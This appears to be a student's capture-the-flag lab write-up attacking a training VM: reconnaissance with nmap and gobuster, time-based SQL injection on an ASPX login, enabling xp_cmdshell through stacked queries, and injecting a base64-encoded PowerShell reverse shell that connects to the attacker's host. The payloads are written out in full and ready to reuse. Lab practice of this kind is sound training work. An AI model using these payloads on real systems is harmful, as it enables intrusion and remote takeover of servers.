7. **Capstone Lab**: Enumerate the Module Exercise - VM #4 and exploit the SQLi vulnerability to get the flag.

```bash
# IP: 192.168.199.50

# Reconnaissance
sudo nmap -sV -sC -v 192.168.199.50
	# OS: Windows
	# 80: HTTP (IIS)
	# 135: RPC
	# 139: NetBios
	# 445: SMB?
	# 5985: HTTP

# Manual reconnaissance of port 80
	# User input:
		# Subscription
		# Login portal http://192.168.199.50/login.aspx
	# Runs ASPX

# Gobuster on both portals
gobuster dir -u http://192.168.199.50 -w /usr/share/wordlists/dirb/common.txt
	# Nothing found
gobuster dir -u http://192.168.199.50:5985 -w /usr/share/wordlists/dirb/common.txt
	# Nothing found either

# Coming back to the login portal.
offsec' or 1=1; WAITFOR DELAY '00:00:05';                  '
	# Returns "wrong credentials", but also sleeps!


# Enable xp_cmdshell theory
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Payload to enable it:
offsec' or 1=1; WAITFOR DELAY '00:00:02'; EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1;RECONFIGURE;WAITFOR DELAY '00:00:05'; -- //                       '
	# Since it did wait for 7 seconds, we can expect that it did work!

# Checking if we can execute some code...
EXECUTE xp_cmdshell 'curl 192.168.45.250';
	# Works!
	
# Finding the reverse shell
' or 1=1; EXECUTE xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANQAwACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='; -- // &ctl00%24ContentPlaceHolder1%24PasswordTextBox=offsec' or 1=1 -- //
	# Worked!

# Upgrading the RS via another one found on revshells
	# Doesn't work

# Simply run Powershell again to be able to cd
powershell

# Locate the flag
gci -recurse -filter "flag.txt"

# WP!
```
![[Pasted image 20250315150300.png]]